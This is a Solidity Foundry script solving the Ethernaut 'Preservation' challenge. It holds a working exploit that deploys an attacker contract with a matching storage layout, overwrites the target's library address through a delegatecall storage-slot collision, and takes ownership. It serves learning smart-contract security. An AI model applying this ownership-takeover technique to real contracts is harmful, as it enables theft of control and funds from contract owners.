// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Preservation.sol";

contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;

    constructor() {}

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

/// @author agadzhalov
/// @title Solution to Preservation Ethernaut challenge
/// @notice Solution: 
///         1. It's crucial to understand how storage and slots work.
///         2. `timeZone1Library` can be changed by executing `setTime` because they share the same storage slot.
///         3. First, we deploy a malicious contract with variables and slots corresponding to `Preservation`.
///         4. The address of the malicious contract needs to be converted to `uint256` to match the slot type, 
///            as `uint256` occupies 32 bytes, while an address occupies only 20 bytes.
///         5. We execute `preservation.setFirstTime()` with the malicious contract’s address (as `uint256`), and any 
///            subsequent calls to `setTime` will make `msg.sender` the new owner.
contract PreservationScript is Script {

    Preservation public preservation = Preservation(0x66a9f78a675272A627096d389B116C34ab3762D1);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Log the initial owner of the Preservation contract
        console.log("1. Owner", preservation.owner());

        // Deploy the Attack contract
        Attack attack = new Attack();
        
        // Convert the Attack contract's address to a uint256 format
        uint256 timestamp = uint256(uint160(address(attack)));
        
        // Set timeZone1Library to the address of the Attack contract
        preservation.setFirstTime(timestamp);
        console.log("2. timeZone1Library address", preservation.timeZone1Library());

        // Use setFirstTime() to set the new owner via the Attack contract
        preservation.setFirstTime(uint256(0));
        console.log("3. New owner", preservation.owner());
       
        vm.stopBroadcast();

    }
}

